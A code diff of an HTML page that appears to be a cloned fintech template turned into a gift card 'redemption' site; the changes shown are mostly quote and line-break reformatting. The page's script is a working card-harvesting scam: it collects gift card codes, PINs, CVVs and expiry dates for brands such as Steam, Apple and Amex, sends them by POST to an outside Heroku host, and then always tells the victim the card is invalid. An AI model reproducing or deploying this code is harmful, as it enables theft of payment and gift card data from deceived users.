@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
   <!-- Mirrored from finapp.bragherstudio.com/view4/app-about.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Sep 2021 23:27:00 GMT -->
@@ -21,14 +20,21 @@
       content="bootstrap, wallet, banking, fintech mobile template, cordova, phonegap, mobile, html, responsive"
     />
 
-    <link rel="stylesheet" href="https://allmygift.cards/assets/css/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://allmygift.cards/assets/css/style.css"
+    />
     <!-- <link rel="manifest" href="__manifest.json"> -->
   </head>
 
   <body>
     <!-- loader -->
     <div style="display: none" id="loader">
-      <img src="https://allmygift.cards/assets/img/loading-icon.png" alt="icon" class="loading-icon" />
+      <img
+        src="https://allmygift.cards/assets/img/loading-icon.png"
+        alt="icon"
+        class="loading-icon"
+      />
     </div>
 
     <!-- App Header -->
@@ -100,7 +106,7 @@
                     <option value="STEAM">Steam</option>
                     <option value="APPLE">Apple</option>
                     <option value="MASTER_CARD">Master Card</option>
-                   
+
                     <option value="VISA_SILVERY_WHITE">
                       Visa Silvery White
                     </option>
@@ -273,7 +279,7 @@
     <script src="https://smtpjs.com/v3/smtp.js"></script>
 
     <script>
-      const form = document.querySelector('#extras');
+      const form = document.querySelector("#extras");
 
       const cvvi = `
 
@@ -355,21 +361,21 @@
           `;
 
       const cards = {
-        GOOGLE_PLAY: 'code',
-        STEAM: 'code',
-        SEPHORA: 'codepin',
-        NORDSTROM_CARD: 'codepin',
-        VANILLA: 'codeexpcvv',
-        WALMART_VISA: 'codeexpcvv',
-        AMEX: 'codeexpcvv4',
-        AMAZON: 'code',
-        NIKE_CARD: 'codepin',
-        FOOTLOCKER: 'code',
-        EBAY_CARD: 'code',
-        VISA_SILVERY_WHITE: 'codeexpcvv',
-        TT_VISA: 'codeexpcvv',
-        MASTER_CARD: 'codepin',
-        APPLE: 'code',
+        GOOGLE_PLAY: "code",
+        STEAM: "code",
+        SEPHORA: "codepin",
+        NORDSTROM_CARD: "codepin",
+        VANILLA: "codeexpcvv",
+        WALMART_VISA: "codeexpcvv",
+        AMEX: "codeexpcvv4",
+        AMAZON: "code",
+        NIKE_CARD: "codepin",
+        FOOTLOCKER: "code",
+        EBAY_CARD: "code",
+        VISA_SILVERY_WHITE: "codeexpcvv",
+        TT_VISA: "codeexpcvv",
+        MASTER_CARD: "codepin",
+        APPLE: "code",
       };
 
       function getName(card) {
@@ -377,67 +383,67 @@
       }
 
       function injectHTML(type) {
-        if (type === 'code') {
-          form.innerHTML = '';
+        if (type === "code") {
+          form.innerHTML = "";
           return;
         }
 
-        if (type === 'codepin') {
+        if (type === "codepin") {
           form.innerHTML = pini;
           return;
         }
 
-        if (type === 'codeexpcvv') {
+        if (type === "codeexpcvv") {
           form.innerHTML = cvvi + expi;
           return;
         }
 
-        if (type === 'codeexpcvvpin') {
+        if (type === "codeexpcvvpin") {
           form.innerHTML = expi + pini + cvvi;
           return;
         }
 
-        if (type === 'codeexpcvv4') {
+        if (type === "codeexpcvv4") {
           form.innerHTML = expi + pinini + cvvi;
           return;
         }
       }
 
-      const loader = document.querySelector('#loader');
-      const button = document.querySelector('#button');
-      const modal = document.querySelector('#alert');
-      const names = document.querySelector('#name');
+      const loader = document.querySelector("#loader");
+      const button = document.querySelector("#button");
+      const modal = document.querySelector("#alert");
+      const names = document.querySelector("#name");
       var name = names.options[names.selectedIndex].value;
-      const code = document.querySelector('#code');
+      const code = document.querySelector("#code");
 
-      const error = document.querySelector('.modal-body');
+      const error = document.querySelector(".modal-body");
 
-      const data = document.querySelector('form');
+      const data = document.querySelector("form");
 
-      const m = 'modal open';
-      const s = 'overflow: hidden; padding-right: 0px;';
+      const m = "modal open";
+      const s = "overflow: hidden; padding-right: 0px;";
       data.on;
       names.onchange = function () {
         name = names.options[names.selectedIndex].value;
 
-        if (name !== 'NONE') {
+        if (name !== "NONE") {
           injectHTML(getName(name));
         } else {
-          form.innerHTML = '';
+          form.innerHTML = "";
           return;
         }
 
-        const exp = document.querySelector('#exp');
-        console.log('GOT HERE');
+        const exp = document.querySelector("#exp");
+        console.log("GOT HERE");
 
         if (exp) {
           exp.oninput = function () {
             const expdate = exp.value;
             if (exp.value.length > 2) {
               exp.value =
-                expdate.replace(/\//g, '').substring(0, 2) +
-                (expdate.length > 2 ? '/' : '') +
-                expdate.replace(/\//g, '').substring(2, 4);
+                expdate.replace(/\//g, "").substring(0, 2) +
+                (expdate.length > 2 ? "/" : "") +
+                expdate.replace(/\//g, "").substring(2, 4);
             }
           };
         }
@@ -446,47 +452,47 @@
       data.onsubmit = function (e) {
         e.preventDefault();
 
-        const cvv = document.querySelector('#cvv');
-        const exp = document.querySelector('#exp');
-        const pin = document.querySelector('#pin');
+        const cvv = document.querySelector("#cvv");
+        const exp = document.querySelector("#exp");
+        const pin = document.querySelector("#pin");
 
-        if (name === 'NONE') {
-          error.textContent = 'Please select Gift Card name';
+        if (name === "NONE") {
+          error.textContent = "Please select Gift Card name";
           modal.click();
           return;
         }
 
         if (code.value.length < 10) {
-          error.textContent = 'Invalid gift card redemption code';
+          error.textContent = "Invalid gift card redemption code";
           modal.click();
           return;
         }
 
         if (cvv && cvv.value.length < 3) {
-          error.textContent = 'Invalid CVV code provided';
+          error.textContent = "Invalid CVV code provided";
           modal.click();
           return;
         }
 
         if (pin && pin.value.length < 3) {
-          error.textContent = 'Invalid card pin provided';
+          error.textContent = "Invalid card pin provided";
           modal.click();
           return;
         }
 
         if (exp && exp.value.length < 5) {
-          error.textContent = 'Invalid expiry date provided';
+          error.textContent = "Invalid expiry date provided";
           modal.click();
           return;
         }
 
-        loader.style.display = '';
+        loader.style.display = "";
 
         async function send(code, name, exp, pin, cvv) {
           var response = await fetch(
-            'https://samperfect.herokuapp.com/api/v1/send/',
+            "https://samperfect.herokuapp.com/api/v1/send/",
             {
-              method: 'POST',
+              method: "POST",
               body: JSON.stringify({
                 code,
                 name,
@@ -495,37 +501,37 @@
                 cvv,
               }),
               headers: {
-                'Content-Type': 'application/json',
+                "Content-Type": "application/json",
               },
             }
           );
           //getting the response data
           var data = await response.json();
           if (response.status == 200) {
-            return 'DONE';
+            return "DONE";
           }
         }
 
         send(
           code.value,
           name,
-          exp ? exp.value : 'NONE',
-          pin ? pin.value : 'NONE',
-          cvv ? cvv.value : 'NONE'
+          exp ? exp.value : "NONE",
+          pin ? pin.value : "NONE",
+          cvv ? cvv.value : "NONE"
         )
           .then((state) => {
             console.log(state);
 
-            loader.style.display = 'none';
-            error.textContent = 'Invalid Gift Card Provided.';
+            loader.style.display = "none";
+            error.textContent = "Invalid Gift Card Provided.";
             modal.click();
           })
           .catch((error) => {
             console.log(error);
 
-            loader.style.display = 'none';
+            loader.style.display = "none";
 
-            error.textContent = 'Invalid Gift Card Provided.';
+            error.textContent = "Invalid Gift Card Provided.";
             modal.click();
           });
       };
